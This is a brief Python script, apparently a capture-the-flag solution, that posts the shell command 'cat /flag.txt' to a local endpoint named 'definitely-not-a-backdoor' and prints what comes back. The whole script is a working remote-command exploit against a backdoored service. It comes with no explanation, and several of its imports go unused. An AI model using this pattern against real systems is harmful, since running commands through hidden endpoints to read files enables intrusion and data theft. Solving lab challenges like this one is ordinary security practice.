import requests
import time
import string
import numpy as np
import statistics

url = 'http://0.0.0.0:5000/definitely-not-a-backdoor'
data = {'definitely-not-a-command': 'cat /flag.txt'}
x = requests.post(url, data=data)
print(x.text)
